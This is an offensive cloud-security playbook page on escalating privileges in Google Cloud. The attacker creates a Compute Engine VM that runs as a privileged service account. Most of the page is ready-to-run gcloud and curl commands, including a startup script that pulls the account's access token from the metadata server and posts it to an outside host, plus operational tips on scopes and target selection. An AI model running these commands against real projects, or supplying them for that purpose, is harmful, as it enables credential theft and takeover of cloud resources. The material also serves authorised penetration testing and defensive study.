---
title: "Compute instance: create a VM as a privileged service account"
description: "Creating a Compute Engine instance with compute.instances.create plus actAs, attaching a privileged service account and a full-access scope, then reading its token from metadata."
keywords:
  - compute.instances.create
  - actAs
  - service account
  - access scope
  - metadata token
  - Compute Engine
---

# Compute instance

With `compute.instances.create` and `iam.serviceAccounts.actAs` on a privileged service account, you launch a VM that runs as that account. Boot it with the `cloud-platform` scope and read the account's token from the metadata server, or pass a startup script that exfiltrates the token so you never need to log in.

## Launch with a privileged account

```bash
gcloud compute instances create pwn --zone <zone> \
  --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --metadata=startup-script='#! /bin/bash
curl -s -H "Metadata-Flavor: Google" \
 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
 | curl -X POST -d @- https://you.example'
```

If you can reach the box, skip the script and read the token after SSHing in:

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

## Exploitation notes

- The access **scope** caps what the token can do: a VM created without `cloud-platform` may hold the role but be scope-limited, so always set `--scopes=cloud-platform`.
- The target account must be usable in the project and you must hold `actAs` on it; `gcloud iam service-accounts list` plus its IAM policy confirm candidates.
- This is noisier than impersonation (it creates a billable VM), so prefer [getAccessToken](../../service-account-impersonation/get-access-token.md) when you hold it; use this when `actAs` plus create is the only lever.

## Tools

- **gcloud** (`compute instances create`): the launch.
- **GCP-IAM-Privilege-Escalation** (Rhino): automates the create-and-steal variant.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: creating VMs with a service account](https://cloud.google.com/compute/docs/access/create-enable-service-accounts-for-instances)
